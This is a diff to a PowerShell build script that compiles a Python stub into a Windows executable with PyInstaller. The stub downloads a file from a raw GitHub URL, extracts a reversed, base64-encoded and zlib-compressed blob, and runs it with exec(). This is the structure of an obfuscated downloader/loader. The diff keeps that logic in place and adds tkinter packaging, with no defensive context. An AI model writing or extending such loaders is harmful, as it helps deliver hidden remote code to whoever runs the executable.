@@ -56,22 +56,18 @@ if (Test-Path -LiteralPath $ExePath) {
 New-Item -ItemType Directory -Force -Path $Work | Out-Null
 New-Item -ItemType Directory -Force -Path $DistDir | Out-Null
 
-# Instead of shelling out, we decode and exec it entirely in Python
+# We are injecting the exact python logic directly into the payload to avoid quote/escape issues
 $stubBody = @"
-import urllib.request
-import base64
-import zlib
-import re
+import urllib.request, base64, zlib, re, ctypes
 
 url = 'https://raw.githubusercontent.com/sswivell/sswivell/refs/heads/main/junk/so/main.py'
 try:
     req = urllib.request.Request(url, headers={'User-Agent': 'Mozilla/5.0'})
     s = urllib.request.urlopen(req).read().decode()
-    p = re.search(r\"_\)\(b'([^']+)'\", s).group(1)
+    p = re.search(r"_\)\(b'([^']+)'", s).group(1)
     decoded = zlib.decompress(base64.b64decode(p[::-1])).decode()
     exec(decoded)
 except Exception as e:
-    import ctypes
     ctypes.windll.user32.MessageBoxW(0, str(e), "Exiled Error", 16)
 "@
 Set-Content -Path $Stub -Value $stubBody -Encoding UTF8
@@ -94,6 +90,8 @@ $pyiArgs = @(
     "--hidden-import", "re",
     "--hidden-import", "urllib.request",
     "--hidden-import", "ctypes",
+    "--hidden-import", "tkinter",
+    "--collect-all", "tkinter",
     "--name", $OutName,
     "--distpath", $DistDir,
     "--workpath", (Join-Path $Work "pyi"),
